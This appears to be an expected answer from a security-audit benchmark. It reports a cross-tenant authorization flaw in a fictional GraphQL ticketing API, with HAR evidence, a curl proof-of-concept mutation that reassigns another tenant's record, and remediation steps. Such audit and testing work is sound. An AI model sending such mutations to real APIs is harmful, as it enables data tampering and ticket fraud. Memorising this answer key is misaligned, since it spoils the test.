# Expected Response

## System
- **Domain:** Event Management / Ticketing
- **System:** VenueCore Ticketing API
- **Example ID:** GQL-0199

## Priority Findings

### Finding 1: Event Ticketing — BOLA via updateResource ID in Path Exposes Cross-Tenant Ticket/Venue Data (Pattern 1.1)
**Severity:** High
**Category:** BOLA / ID in Path Without Ownership Check

**Summary:**
Per §4.0 (RISK-GQL-199): The `getResource` resolver fetches by `resourceId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 1.1 — ID in path without ownership check): the `updateResource` mutation accepts any `resourceId` without verifying the caller's tenant owns the resource. An attacker from `tenant-25a5` submitted `updateResource(id: "R-2199", input: {status: "approved", ownerId: "attacker-25a56193"})` against a ticketing resource belonging to `tenant-6193`, receiving `CONFIDENTIAL-25a56193`. In Event Management / Ticketing, unauthorized modification of ticket data, event configurations, and venue records enables ticket fraud and event disruption.

**Evidence from HAR:**
- Request: `POST https://api.venuecore-ticketing-.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-25a5`
- Mutation: `updateResource(id: "R-2199", input: {status: "approved", ownerId: "attacker-25a56193"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-6193"`, `ownerId: "other-user-25a56193"`, `sensitiveField: "CONFIDENTIAL-25a56193"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-25a56193`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-199 | getResource resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 1.1 | ID in path without ownership check |
| HAR mutation | id: "R-2199" | Cross-tenant ticket resource ID |
| HAR response | tenantId | tenant-6193 returned to tenant-25a5 |
| HAR response | sensitiveField | CONFIDENTIAL-25a56193 |
| HAR header | x-request-id | req-25a56193 |

## Steps to Reproduce

### Step 1 — updateResource BOLA ID in path ticketing (HAR)
```bash
curl -s -X POST https://api.venuecore-ticketing-.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-25a5" \
  -d '{"query": "mutation { updateResource(id: \"R-2199\", input: {status: \"approved\", ownerId: \"attacker-25a56193\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-6193` ticketing record mutated, returns `CONFIDENTIAL-25a56193`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput`; derive from JWT.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
